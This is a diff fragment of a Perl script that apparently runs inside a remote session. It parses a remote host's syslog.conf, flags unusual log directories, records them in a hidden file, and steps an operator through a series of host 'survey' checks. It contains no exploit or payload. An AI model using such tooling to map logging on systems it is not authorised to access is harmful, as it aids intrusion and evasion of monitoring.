+    if (open(IN2,"< $syslogfile")) {
+      while (<IN2>) {
+	next if !$_ or /^\s*\#/ ; 	 # skip comments and empties
+	if (my ($dir) = m,\s(/.*)/[^/]*\s*$,g) {
+	  s/$1/$COLOR_FAILURE$dir$COLOR_NORMAL/g;
+	  unless (($dir =~ m,/var/(log|adm)$,) or ($dir =~ m,/dev$,)) {
+	    push(@odddirs,$dir);
+	  }
+	}
+	$logcontent .= $_;
+      }
+      close(IN2);
+    }
+  }
+  my $oddcontent = "";
+  $logdirfile = "$optmp/.logdirs.$nopen_rhostname" ;
+  if (@odddirs) {
+    # Highlighting directory names we did not expect to see,
+    # also adding them to $logdirfile. -gs logcheck uses this
+    # to do its listings.
+    $oddcontent = 
+      "$COLOR_FAILURE\n".
+      '#' x 80 .
+      "#\a UNUSUAL DIRECTORIES BEING LOGGED TO:\n".
+      "# (Added to $logdirfile)\n".
+      '#' x 80 .$COLOR_NORMAL."\n    ".
+      join("\n    ",uniqify_array(@odddirs));
+    my @therealready = split(/\s+/,
+			     `cat $logdirfile 2>/dev/null`);
+    if (open(OUT2,">$logdirfile")) {
+      foreach (uniqify_array(@therealready,@odddirs)) {
+	print OUT2 "$_\n";
+      }
+    }
+    close(OUT2);
+  }
+  if ($oddcontent) {
+    progprint($oddcontent);
+    doit("-beep 5");
+    offerabort
+      (".$COLOR_FAILURE.\n\n".
+       '#' x 80 . "\n" .
+       "#$COLOR_NOTE syslog.conf content from $nopen_rhostname:$COLOR_FAILURE\n".
+       '#' x 80 . "\n" .
+       $COLOR_NORMAL .
+       $logcontent .
+       $oddcontent."\n$COLOR_NOTE\n".
+       "(Logs check is next if you continue.)".
+       "");
+  } else {
+    # Here we pause only if they did not use -Y/$nopauses
+    progprint
+      (".$COLOR_FAILURE.\n\n".
+       '#' x 80 . "\n" .
+       "#$COLOR_NOTE syslog.conf content from $nopen_rhostname:$COLOR_FAILURE\n".
+       '#' x 80 . "\n" .
+       $COLOR_NORMAL .
+       $logcontent .
+       $oddcontent.
+       "") if $nopauses;
+    offerabort
+      (".$COLOR_FAILURE.\n\n".
+       '#' x 80 . "\n" .
+       "#$COLOR_NOTE syslog.conf content from $nopen_rhostname:$COLOR_FAILURE\n".
+       '#' x 80 . "\n" .
+       $COLOR_NORMAL .
+       $logcontent .
+       $oddcontent.
+       "") unless $nopauses;
+  }
+  # Now using require autologcheck after setting @ARGV to our -logcheck arguments.
+  my @orig = @ARGV;
+  @ARGV = ("-P");
+  require "$opetc/autologcheck";
+  @ARGV = @orig;
+}
+#gschecksyslogs
+
+sub skipordo {
+  local ($type) = (@_);
+  my $subtocall = "gs$type";
+  my ($dotypes,$skiptypes)= "";
+  foreach my $type (@surveytypes) {
+    $dotypes .= " $type" unless $skip{$type};
+    $skiptypes .= " $type" if $skip{$type};
+  }
+  $skiptypes = "\n(default of <S>kip for$COLOR_NOTE$skiptypes$COLOR_FAILURE)" if $skiptypes;
+  my $default = "C";
+  $default = "S" if !$doover and $surveysalreadydone{$type};
+  $default = "S" if $skip{$type};
+  my $more = $COLOR_FAILURE.
+    "Proceeding with the following survey types$skiptypes:\n\n".
+    "    $dotypes\n\n".
+    "(To avoid these \"About to run\" prompts, use -Y option or enter \"Y\" here.)\n$COLOR_NORMAL\n"
+      unless $firsttime++;
+  my $more2 = "$COLOR_FAILURE (which has been done already)$COLOR_NORMAL"
+    if $skip{$type};
+  my ($ans,$longans) = ("S") if $skip{$type};
+#  unless ($doover or !$skip{$type} or $nopauses) {
+#    $extraoutput = "$COLOR_FAILURE\n".
+#      "Skipping these survey types already done before:"
+#	unless $extraoutput;
+#    $extraoutput .= "\n\t$type";
+#  }
+  return 0 if ($nopauses and !$doover and $skip{$type});
+#progprint
+#      ("$extraoutput$COLOR_NORMAL\n\n".
+#       $more.
+#       "About to run gs$type() check. You can\n".
+#       "  <S>kip gs$type(),\n".
+#       "  <C>ontinue or\n".
+#       "  <A>bort remaining survey\n".
+#       "Choose:",);
+  ($ans,$longans) =
+    mygetinput
+      ("$extraoutput$COLOR_NORMAL\n\n".
+       $more.
+       "About to run gs$type() check. You can\n".
+       "  <S>kip gs$type(),\n".
+       "  <C>ontinue or\n".
+       "  <A>bort remaining survey\n".
+       "Choose:",
+       $default,
+       "C","S","Y","A")
+	unless $nopauses;
+  $extraoutput = "";
+  $aborting++ if $ans eq "a";
+  $nopauses++ if $ans eq "y";
+  return 0 if $aborting;
+  if ($ans eq "s") {
+    return 0;
+  }
+  $donecount++;
+  dbg("ans=$ans longans=$longans= before $subtocall before date");
+  &$subtocall();
+  dbg("ans=$ans longans=$longans= after $subtocall before date");
+  `date > $optmp/.survey.${type}done.$nopen_rhostname`;
+  return 1;
+}
+#skipordo
+
